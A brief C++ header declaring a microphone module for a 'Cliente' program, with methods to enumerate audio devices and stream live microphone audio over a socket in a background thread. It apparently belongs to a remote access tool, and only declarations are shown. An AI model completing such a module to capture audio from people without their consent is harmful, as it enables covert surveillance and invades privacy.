#ifndef ___MIC
#define ___MIC

#include "headers.hpp"
#include "cliente.hpp"
#include <mmsystem.h>

class Cliente;

class Mod_Mic{
	private:
		Cliente* ptr_copy = nullptr;
		std::thread thLiveMic;
		std::mutex mic_mutex;

	
	public:
		bool isLiveMic = false;
		SOCKET sckSocket = INVALID_SOCKET;
	
		int p_DeviceID = WAVE_MAPPER; //Default
		void m_EmpezarLive();
		void m_DetenerLive();

		void m_LiveMicTh(); //thread para mandar mic en tiempo real
		void m_Enviar_Dispositivos();
		std::vector<std::string> m_ObtenerDispositivos();

		Mod_Mic(Cliente* pCliente) : ptr_copy(pCliente) {}

};

#endif